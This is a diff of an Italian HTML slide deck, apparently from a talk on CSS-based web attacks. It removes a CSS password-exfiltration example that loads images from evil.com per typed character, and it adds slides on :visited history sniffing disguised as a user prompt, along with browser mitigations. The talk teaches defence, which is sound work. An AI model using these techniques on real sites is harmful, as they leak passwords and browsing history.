@@ -78,61 +78,110 @@
   </p-fragment>
 </p-slide>
 <p-slide>
-  <h2 class="center">Ci stiamo solo scaldando&hellip;</h2>
-</p-slide>
-<p-slide class="center">
-  <img src="img/react.svg" alt="React.js" style="height: 4em;">
-  <p-fragment>sincronizza attributo e proprietà <code>value</code></p-fragment>
-  <p-fragment><h3>degli elementi <code>&lt;input></code></h3></p-fragment>
-  <p-fragment><h2>anche <code>type="password"</code></h2></p-fragment>
-</p-slide>
-<p-slide>
-  <pre class="language-jsx self-center"><code>import { useState } from 'react';
-
-export default function UserPassword() {
-  const [pwd, setPwd] = useState('');
-  return &lt;label>Password:
-    &lt;input type="password" value={pwd}
-      onChange={e => setPwd(e.target.value)}
-    />
-  &lt;/label>;
-}</code></pre>
+  <h3 class="center">Inoltre</h3>
+  <p-fragment class="center">
+    <p>possiamo stilizzare <code>:visited</code> solo con</p>
+  </p-fragment>
+  <p-fragment class="self-center">
+    <ul>
+      <li>👉 <code>color</code></li>
+      <li>👉 <code>background-color</code></li>
+      <li>👉 <code>border-color</code></li>
+      <li>👉 <code>outline-color</code></li>
+      <li>👉 <code>column-rule-color</code></li>
+      <li>👉 <code>fill</code>, <code>stroke</code> (solo per i colori)</li>
+    </ul>
+  </p-fragment>
 </p-slide>
 <p-slide>
-  <img src="img/whatever.gif" alt="Whatever" class="full-media">
+  <h1 class="center">Basta?</h1>
 </p-slide>
 <p-slide>
-<pre class="language-css self-center"><code>input[type='password'][value$='a']::before {
-  content: url('http://evil.com/a.gif');
-}
-input[type='password'][value$='b']::before {
-  content: url('http://evil.com/b.gif');
-}
-input[type='password'][value$='c']::before {
-  content: url('http://evil.com/c.gif');
-}
+  <div class="two-columns align-center">
+    <h4 class="center">Si può <em>chiedere all'utente</em> quali siti ha visitato?</h4>
+    <div style="position: relative; font-size: 80%;">
+      <p-fragment style="display: block;">
+        <p>
+          Prego inserire i siti visitati:
+        </p>
+        <div style="border: .05em solid; height: 4em; padding: .25em">
+          https://www.s|
+        </div>
+      </p-fragment>
+      <p-fragment class="big-x"></p-fragment>
+    </div>
+  </div>
+</p-slide>
+<p-slide>
+  <div class="two-columns align-center">
+    <div>
+      <pre class="language-html"><code>&lt;a href="http://site1.com">&lt;/a>
+&lt;a href="http://site2.com">&lt;/a>
+&lt;a href="http://site3.com">&lt;/a>
 ...</code></pre>
+      <pre class="language-css"><code>a:visited { background: black }</code></pre>
+    </div>
+    <div>
+      <div class="lcd-display">
+        <div></div>
+        <div class="on"></div>
+        <div class="on"></div>
+        <div class="on"></div>
+        <div class="on"></div>
+        <div class="on"></div>
+        <div></div>
+
+        <div class="on"></div>
+        <div></div>
+        <div class="on"></div>
+        <div class="on"></div>
+        <div class="on"></div>
+        <div></div>
+        <div class="on"></div>
+
+        <div class="on"></div>
+        <div class="on"></div>
+        <div class="on"></div>
+        <div></div>
+        <div class="on"></div>
+        <div class="on"></div>
+        <div class="on"></div>
+
+        <div></div>
+        <div></div>
+        <div></div>
+        <div></div>
+        <div></div>
+        <div class="on"></div>
+        <div class="on"></div>
+      </div>
+      <p>Inserire il numero sopra:</p>
+      <div style="border: .05em solid; padding: .25em">|</div>
+    </div>
+  </div>
 </p-slide>
 <p-slide>
-  <img src="img/really.gif" alt="Really?" class="full-media">
-</p-slide>
-<p-slide class="center">
-  <h1>Abbiamo la <em>certezza</em> di sapere da dove arrivano i nostri fogli di stile?</h1>
-</p-slide>
-<p-slide class="justify-end">
-  <img src="img/pfft-duh.gif" alt="Pfft, duh!" class="full-media">
-  <h2 class="meme-text center uppercase">Beh ovvio!</h2>
+  <h3 class="center">E quindi&hellip;</h3>
+  <img src="img/visited-once-and-4all.png" alt="Chromium Issue 713521: Eliminate :visited privacy issues once and for all" style="height: 2em;">
 </p-slide>
 <p-slide>
-  <h1 class="center">Potreste non essere stati <em>voi</em> ad essere attaccati</h1>
+  <div class="two-columns align-center">
+    <span style="font-size: 400%; text-align: end;">⌚</span>
+    <div><em>Ridurre</em> i tempi per cui un link è considerato "visitato"</div>
+  </div>
 </p-slide>
 <p-slide>
-  <h4 class="our-header">Script esterni nelle nostre pagine</h4>
-  <ul class="self-center">
-    <li><p-fragment>👉 profilazione</p-fragment></li>
-    <li><p-fragment>👉 pubblicità</p-fragment></li>
-    <li><p-fragment>👉 social</p-fragment></li>
-    <li><p-fragment>👉 video</p-fragment></li>
-    <li><p-fragment>👉 widget</p-fragment></li>
-  </ul>
+  <div class="two-columns align-center">
+    <span style="font-size: 400%; text-align: end;">🙅‍♀️</span>
+    <div>
+      <em>Limitare</em> lo stato "visitato" ai soli link <em>della stessa origine</em><br>
+      <p-fragment><small>(&hellip; Sì, ma Google?)</small></p-fragment>
+    </div>
+  </div>
+</p-slide>
+<p-slide>
+  <div class="two-columns align-center">
+    <span style="font-size: 400%; text-align: end;">👬</span>
+    <div><em>Limitare</em> lo stato "visitato" ai soli link <em>azionati da quella origine</em></div>
+  </div>
 </p-slide>
